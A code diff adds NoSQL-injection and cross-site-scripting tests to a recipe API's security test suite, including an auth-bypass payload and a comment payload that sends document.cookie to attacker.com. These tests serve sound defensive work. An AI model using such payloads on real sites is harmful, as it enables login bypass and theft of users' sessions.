@@ -161,6 +161,42 @@ async function runSecurityTests() {
     const searchRes = await request("GET", `/api/recipes?search=${encodeURIComponent(regexPayload)}`);
     report("ReDoS payload safely handled without crashing (200)", searchRes.status === 200);
 
+    // 8. NoSQL Injection Defense ($ne / $gt operator injection)
+    console.log("\n--- 8. NoSQL Injection Defense ---");
+    const nosqlPayload = {
+      email: { $ne: null },
+      password: { $gt: "" }
+    };
+    const nosqlRes = await request("POST", "/api/auth/login", {}, nosqlPayload);
+    report("NoSQL operator injection in auth rejected (400 Bad Request)", nosqlRes.status === 400);
+
+    // 9. Cross-Site Scripting (XSS) Sanitization
+    console.log("\n--- 9. Cross-Site Scripting (XSS) Sanitization ---");
+    const xssRecipePayload = {
+      title: "<script>alert('XSS_ATTACK')</script>Spicy Curry",
+      description: "<img src=x onerror=alert(document.cookie)>Delicious spicy curry.",
+      ingredients: ["<svg onload=alert(1)>", "Garam Masala"],
+      instructions: "<a href='javascript:alert(1)'>Click for secret recipe</a>",
+      category: "Indian",
+      difficulty: "Easy",
+      preparationTime: 25,
+      image: "javascript:alert('xss_image_src')"
+    };
+    const xssRes = await request("POST", "/api/recipes", { Authorization: `Bearer ${chefToken}` }, xssRecipePayload);
+    report("Recipe created with sanitized content (201)", xssRes.status === 201);
+    report("Raw <script> tags escaped in title", xssRes.data.recipe.title.includes("&lt;script&gt;"));
+    report("Raw <img> onerror tags escaped in description", xssRes.data.recipe.description.includes("&lt;img"));
+    report("Raw <svg> tags escaped in ingredients", xssRes.data.recipe.ingredients[0].includes("&lt;svg"));
+    report("javascript: pseudo-protocol in image URL stripped", !xssRes.data.recipe.image.startsWith("javascript:"));
+
+    // 10. Stored XSS in Comments Sanitization
+    const xssCommentPayload = {
+      text: "<script>document.location='http://attacker.com/steal?c='+document.cookie</script>Great recipe!"
+    };
+    const xssCommentRes = await request("POST", `/api/recipes/${recipeId}/comments`, { Authorization: `Bearer ${chefToken}` }, xssCommentPayload);
+    report("Comment created with sanitized text (201)", xssCommentRes.status === 201);
+    report("Raw <script> tag escaped in comment", xssCommentRes.data.comment.comment.includes("&lt;script&gt;"));
+
     console.log("\n==================================================");
     console.log(`Cybersecurity Audit Summary: ${passed} PASSED, ${failed} FAILED`);
     console.log("==================================================");
